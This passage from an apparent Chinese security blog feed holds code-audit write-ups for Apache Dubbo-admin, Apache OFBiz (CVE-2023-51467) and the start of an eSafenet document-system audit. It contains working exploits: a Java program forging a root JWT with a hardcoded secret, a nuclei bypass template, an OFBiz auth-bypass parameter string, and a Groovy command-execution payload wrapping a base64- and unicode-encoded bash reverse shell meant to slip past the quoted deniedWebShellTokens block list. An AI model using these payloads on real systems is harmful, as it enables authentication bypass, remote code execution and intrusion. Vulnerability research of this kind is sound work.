and &#x27;Authorization&#x27; string is missing in the request headers,</span><br>                <span class="hljs-comment">//reject this request(http403).</span><br>                AuthInterceptor.authRejectedResponse(response);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (jwtTokenUtil.canTokenBeExpiration(token)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-comment">//while user not found, or token timeout, reject this request(http401).</span><br>            AuthInterceptor.loginFailResponse(response);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以分析一下，从Authorization中获取jwt，然后确定过期时间。现在我们有办法对其进行加密，就是针对一个长期不过期的jwt。</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.dubbo.admin.controller;<br><br><span class="hljs-keyword">import</span> io.jsonwebtoken.Jwts;<br><span class="hljs-keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jwt</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateToken</span><span class="hljs-params">(String rootUserName)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">secret</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;86295dd0c4ef69a1036b0b0c15158d77&quot;</span>;<br>        <span class="hljs-type">Long</span> <span class="hljs-variable">timeStamp</span> <span class="hljs-operator">=</span> <span class="hljs-number">9999999999999L</span>;<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(timeStamp);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">SignatureAlgorithm</span> <span class="hljs-variable">defaultAlgorithm</span> <span class="hljs-operator">=</span> SignatureAlgorithm.HS512;<br>        Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>        claims.put(<span class="hljs-string">&quot;sub&quot;</span>, rootUserName);<br>        <span class="hljs-keyword">return</span> Jwts.builder()<br>                .setClaims(claims)<br>                .setExpiration(date)<br>                .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()))<br>                .signWith(defaultAlgorithm, secret)<br>                .compact();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> jwt.generateToken(<span class="hljs-string">&quot;root&quot;</span>);<br>        System.out.println(root);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>In this way, you can get root’s jwt.</p><p>Calculate and get</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jwt">eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">dubbo-admin_Unauthorized_bypass</span><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Template</span> <span class="hljs-string">Name</span><br>  <span class="hljs-attr">author:</span> <br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">medium</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">dubbo-admin</span> <span class="hljs-string">Unauthorized</span> <span class="hljs-string">access</span> <span class="hljs-string">bypass</span><br>  <span class="hljs-attr">reference:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">apache,dubbo-admin</span><br><span class="hljs-attr">requests:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|+</span><br><span class="hljs-string">        GET /api/dev/consumers HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        Accept: application/json, text/plain, */*</span><br><span class="hljs-string">        Authorization: eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg</span><br><span class="hljs-string">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span><br><span class="hljs-string">        Referer: http://&#123;&#123;Hostname&#125;&#125;/</span><br><span class="hljs-string">        Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">        Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">        Connection: close</span><br><span class="hljs-string"></span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">header</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;HTTP/1.1 200 &#x27;</span><br><br></code></pre></td></tr></table></figure><p>A poc of nuclei. You can quickly verify permission bypass.</p><h2 id="0x03-尝试找r点"><a href="#0x03-尝试找r点" class="headerlink" title="0x03 尝试找r点"></a>0x03 尝试找r点</h2><p><img src="image-20231106195354794.png" alt="image-20231106195354794"></p><p>pom里面有snakeyaml。</p><p>自然想到yaml.load()。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;common&#x2F;util&#x2F;YamlParser.java</p><p><img src="image-20231106195602958.png" alt="image-20231106195602958"></p><p>最后找到这两个，可控的地方。</p><p>我门跟一下下面的</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;service&#x2F;impl&#x2F;MeshRouteServiceImpl.java</p><p><img src="image-20231106195729394.png" alt="image-20231106195729394"></p><p>可以看到是检查mesh的规则。</p><p><img src="image-20231106195807880.png" alt="image-20231106195807880"></p><p>找一下调用，发现在创建规则和更新时都会触发。</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;controller&#x2F;MeshRouteController.java</p><p><img src="image-20231106200004806.png" alt="image-20231106200004806"></p><p><img src="image-20231106200043446.png" alt="image-20231106200043446"></p><p>最后也是找到路由点。</p><p>接下来测试一下</p><p><img src="image-20231106201002652.png" alt="image-20231106201002652"></p><p>随便输入，然后替换为伪造的jwt</p><p><img src="image-20231106201127532.png" alt="image-20231106201127532"></p><p><img src="image-20231106201325511.png" alt="image-20231106201325511"></p><p>是能成功登入的</p><p>来到msh路由</p><p><img src="image-20231106201410048.png" alt="image-20231106201410048"></p><p><img src="image-20231106201624404.png" alt="image-20231106201624404"></p><p><img src="image-20231106201718869.png" alt="image-20231106201718869"></p><p><img src="image-20231106201800526.png" alt="image-20231106201800526"></p><p>跟进一下，发现SafeConstructor()开启了白名单。G.</p><p><img src="image-20231106202141390.png" alt="image-20231106202141390"></p><p>手动改了后，重新尝试。</p><p><img src="image-20231106202341361.png" alt="image-20231106202341361"></p><p><img src="image-20231106202403421.png" alt="image-20231106202403421"></p><p>可以成功执行。</p><p><img src="image-20231106202532708.png" alt="image-20231106202532708"></p><p>查看了一下版本 0.3开始SafeConstructor()，</p><p><img src="image-20231106202618841.png" alt="image-20231106202618841"></p><p>0.2看来可以的。</p><p><img src="image-20231106202833829.png" alt="image-20231106202833829"></p><p>单jwt机制在0.4引用。鸡肋。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ofbiz-CVE-2023-51467</title>
    <link href="/2024/01/09/ofbiz-CVE-2023-51467/"/>
    <url>/2024/01/09/ofbiz-CVE-2023-51467/</url>
    
    <content type="html"><![CDATA[<h2 id="ofbiz-CVE-2023-51467"><a href="#ofbiz-CVE-2023-51467" class="headerlink" title="ofbiz-CVE-2023-51467"></a>ofbiz-CVE-2023-51467</h2><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​ofbiz-18.12.10及以前，鉴权绕过使用<code>execute()</code>方法执行外部命令。</p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;calc&quot;</span>.execute()<br></code></pre></td></tr></table></figure><p>代码没有对Groovy脚本，<code>execute()</code>方法进行过滤。</p><p>最新版修了鉴权绕过，命令执行没有修复。</p><h3 id="0x02-命令过滤"><a href="#0x02-命令过滤" class="headerlink" title="0x02 命令过滤"></a>0x02 命令过滤</h3><p>在路径framework&#x2F;security&#x2F;config&#x2F;security.properties 里面存在命令黑名单。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">deniedWebShellTokens=java.,beans,freemarker,&lt;script,javascript,&lt;body,body ,&lt;form,&lt;jsp:,&lt;c:out,taglib,&lt;prefix,&lt;%@ page,<span class="hljs-meta">&lt;?php,exec(,alert(,\</span><br><span class="hljs-meta">                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\</span><br><span class="hljs-meta">                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\</span><br><span class="hljs-meta">                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\</span><br><span class="hljs-meta">                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,&quot;cmd&quot;,*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate</span><br></code></pre></td></tr></table></figure><p>限制也不多，也可以直接使用unicode编码就可以绕过。</p><h3 id="0X03-Groovy分析"><a href="#0X03-Groovy分析" class="headerlink" title="0X03  Groovy分析"></a>0X03  Groovy分析</h3><p>apache-ofbiz-18.12.11&#x2F;framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml </p><p>412-416行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request-map</span> <span class="hljs-attr">uri</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">security</span> <span class="hljs-attr">https</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">auth</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">request-map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到是view类型</p><p>652行写着对应配置位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">view-map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;screen&quot;</span> <span class="hljs-attr">page</span>=<span class="hljs-string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span><br><br></code></pre></td></tr></table></figure><p>apache-ofbiz-18.12.11&#x2F;framework&#x2F;webtools&#x2F;widget&#x2F;EntityScreens.xml</p><p>74-96行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">actions</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;titleProperty&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;tabButtonItem&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;programExport&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/groovyScripts/entity/ProgramExport.groovy&quot;</span>/&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">actions</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">decorator-screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;CommonImportExportDecorator&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;<span class="hljs-name">decorator-section</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;body&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                     <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">include-form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                            <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html-template</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;/<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-screen</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;/<span class="hljs-name">screen</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure><p>可以看见调用了</p><p> &#x2F;webtools&#x2F;groovyScripts&#x2F;entity&#x2F;ProgramExport.groovy</p><p>56-73行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">    parameters.groovyProgram = groovyProgram<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    groovyProgram = parameters.groovyProgram<br>&#125;<br><br><span class="hljs-comment">// Add imports for script.</span><br><span class="hljs-type">def</span> <span class="hljs-variable">importCustomizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportCustomizer</span>()<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)<br><span class="hljs-type">def</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompilerConfiguration</span>()<br>configuration.addCompilationCustomizers(importCustomizer)<br><br><span class="hljs-type">Binding</span> <span class="hljs-variable">binding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binding</span>()<br>binding.setVariable(<span class="hljs-string">&quot;delegator&quot;</span>, delegator)<br>binding.setVariable(<span class="hljs-string">&quot;recordValues&quot;</span>, recordValues)<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<br><span class="hljs-type">def</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>(loader, binding, configuration)<br></code></pre></td></tr></table></figure><p>从groovyProgram获取参数然后执行。</p><p>org&#x2F;apache&#x2F;ofbiz&#x2F;base&#x2F;util&#x2F;GroovyUtil.java</p><p><img src="image-20240102025028710.png" alt="image-20240102025028710"></p><p>这个回去去上面的配置，然后执行。</p><h3 id="0x04-鉴权绕过分析"><a href="#0x04-鉴权绕过分析" class="headerlink" title="0x04 鉴权绕过分析"></a>0x04 鉴权绕过分析</h3><p>org&#x2F;apache&#x2F;ofbiz&#x2F;webapp&#x2F;control&#x2F;LoginWorker.java#checkLogin</p><p><img src="image-20240109173229165.png" alt="image-20240109173229165"></p><p><img src="image-20240109173248165.png" alt="image-20240109173248165"></p><p>就是不满足if就可以返回success。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (username == <span class="hljs-literal">null</span><br>        || (password == <span class="hljs-literal">null</span> &amp;&amp; token == <span class="hljs-literal">null</span>)<br>        || <span class="hljs-string">&quot;error&quot;</span>.equals(login(request, response)))<br></code></pre></td></tr></table></figure><p><img src="image-20240109173337709.png" alt="image-20240109173337709"></p><p>username，password，token可控，可以构造。</p><p>看login(request, response)就行</p><p>java&#x2F;org&#x2F;apache&#x2F;ofbiz&#x2F;webapp&#x2F;control&#x2F;LoginWorker.java#login()</p><p><img src="image-20240109173652511.png" alt="image-20240109173652511"></p><p>判断username，password，token是否为null，不为null就是赋予值。</p><p>然后判断非空，不为空就赋予值</p><p>然后username，password，token非否为空,为空就在数组unpwErrMsgList加入数据。</p><p><img src="image-20240109174050423.png" alt="image-20240109174050423"></p><p>最重要的就是这里。</p><p>unpwErrMsgList只要不为空就进入if。然后requirePasswordChange可控，传入Y就可以返回suceess。</p><p><img src="image-20240109174308632.png" alt="image-20240109174308632"></p><p>然后不满足”error”.equals(login(request, response))，最后返回checkLogin()函数返回success，绕过鉴权。</p><p>最后构造poc。不赋值获取到的是””，不是NULL，””不等于NULL,为false，但使用isNotEmpty()判断时是true。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">USERNAME=<span class="hljs-variable">&amp;</span>PASSWORD=<span class="hljs-variable">&amp;</span>TOKEN=<span class="hljs-variable">&amp;</span>requirePasswordC<span class="hljs-attr">hange</span><span class="hljs-operator">=</span>y<br></code></pre></td></tr></table></figure><h3 id="0x05-复现"><a href="#0x05-复现" class="headerlink" title="0x05  复现"></a>0x05  复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;$&#123;&#x27;your command&#x27;.execute()&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>对open -a calculator</p><p><img src="image-20240102021202674.png" alt="image-20240102021202674"></p><p>对Reverse Shell进行unicode编码进行测试。</p><p>先对Reverse Shell转换成java可以识别的形式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>在使用unicode编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u007B\u0065\u0063\u0068\u006F\u002C\u004C\u0032\u004A\u0070\u0062\u0069\u0039\u0069\u0059\u0058\u004E\u006F\u0049\u0043\u0031\u0070\u0049\u0044\u0034\u006D\u0049\u0043\u0039\u006B\u005A\u0058\u0059\u0076\u0064\u0047\u004E\u0077\u004C\u007A\u0045\u0079\u004E\u0079\u0034\u0077\u004C\u006A\u0041\u0075\u004D\u0053\u0038\u0034\u004F\u0044\u0067\u0034\u0049\u0044\u0041\u002B\u004A\u006A\u0045\u003D\u007D\u007C\u007B\u0062\u0061\u0073\u0065\u0036\u0034\u002C\u002D\u0064\u007D\u007C\u007B\u0062\u0061\u0073\u0068\u002C\u002D\u0069\u007D<br></code></pre></td></tr></table></figure><p>成功获取shell</p><p><img src="image-20240102020946197.png" alt="image-20240102020946197"></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>亿赛通电子文档代码审计</title>
    <link href="/2023/12/22/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/22/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>​亿赛通电子文档安全管理系统最近很火热，趁热分析一波。</p><h2 id="0x02-（1day）jdbc反序列化"><a href="#0x02-（1day）jdbc反序列化" class="headerlink" title="0x02  （1day）jdbc反序列化"></a>0x02  （1day）jdbc反序列化</h2><p>没什么用，安装包没有mysql依赖。</p><p><img src="image-20231222174021402.png" alt="image-20231222174021402"></p><p><img src="image-20231222174046008.png" alt="image-20231222174046008"></p><p>路由 &#x2F;CDGServer3&#x2F;LdapAjax</p><p>对应com.esafenet.servlet.ajax.DBAjax</p><p><img src="image-20231220093540537.png" alt="image-20231220093540537"></p><p>doPost接受传参command，若果等于testConnection就调用testConnection方法。</p><p><img src="image-20231222121135375.png" alt="image-20231222121135375"></p><p>testConnection会获取数据库账号密码，ip，configvalues，然后判断使用什么数据库，然后调用connection方法。</p><p><img src="image-20231220094157288.png" alt="image-20231220094157288"></p><p>然后就是反射获取服务，链接。全都可以控制，很容易就想起jdbc。</p><p>webapps&#x2F;CDGServer3&#x2F;config&#x2F;DBConfig.jsp</p><p>jsp里面有对应传输的格式。</p><p><img src="image-20231220094540250.png" alt="image-20231220094540250"></p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231220095830915.png" alt="image-20231220095830915"></p><h2 id="0x02-1day？nday-xstreem反序列化"><a href="#0x02-1day？nday-xstreem反序列化" class="headerlink" title="0x02 (1day？nday)xstreem反序列化"></a>0x02 (1day？nday)xstreem反序列化</h2><p>查看lib，发现存在低版本的xstream的环境包，很自然就可以想到xstream低版本反序列化漏洞。</p><p><img src="image-20231221170223093.png" alt="image-20231221170223093"></p><p>所以只需要找到一个servlet的里面调用了fromXML就可以了。</p><p>所以我们找servlet里面的service方法，看谁调用了fromXML方法就可以了.</p><p>由于触发点很多，我们希望只在service里面就找到触发点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">MATCH  (m1:Method &#123;NAME: <span class="hljs-string">&quot;service&quot;</span>&#125;) WHERE m1.CLASSNAME =~ <span class="hljs-string">&quot;com.esafenet.servlet.service.*&quot;</span><br><span class="hljs-type">MATCH</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> 